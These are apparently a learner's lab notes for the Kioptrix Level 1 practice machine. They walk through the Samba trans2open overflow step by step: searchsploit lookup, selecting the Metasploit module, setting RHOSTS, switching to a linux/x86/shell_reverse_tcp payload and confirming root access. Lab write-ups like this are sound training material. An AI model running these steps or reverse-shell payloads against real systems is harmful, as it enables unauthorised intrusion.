
- Load up metasploit by typing `msfconsole` in your terminal
- Now previously we did search for vulnerabilities using our terminal using `searchsploit samba2.2`
- we got this: `Samba 2.2.8 (BSD x86) - 'trans2open' Remote Overflow (Metasploit)                                                                                                               | bsd_x86/remote/16880.rb`
- Now once we're in msfconsole, we search for trans2open by typing `search trans2open`
- We get 4 outputs of the same vulnerabilities but for different OS's.
- Owing to the reconnaissance we conducted earlier we know that our machine runs redhat linux in it.
- so we go for option 1 by typing `use 1`
- Then type `options`
- Following this, we set our RHOST or remote host or victim
- To do so. `set RHOSTS <ip>` and then type `exploit`
- We see multiple sessions opening and closing, so interrupt the payload and stop it.
- type `options` again, and this time we can notice this payload option `Payload options (linux/x86/meterpreter/reverse_tcp)`
- So here msfconsole is suggesting you the payload as the payload could be the problem here.
- Type `set payload linux/x86` and then press tab twice to get a list of payload option.
- We can choose one specific non staged payload, ie, `linux/x86/shell_reverse_tcp` and use it. Type `set payload linux/x86/shell_reverse_tcp` and then `exploit`.
- This finally returns us with our shell, and have successfully rooted the machine!
- To confirm type `whoami`, `hostname`, etc.
- we see our confirmation - kioptrix.level1



- You can also manually exploit the machine by using the OpenLuck exploit in github that we noted earlier in our notes.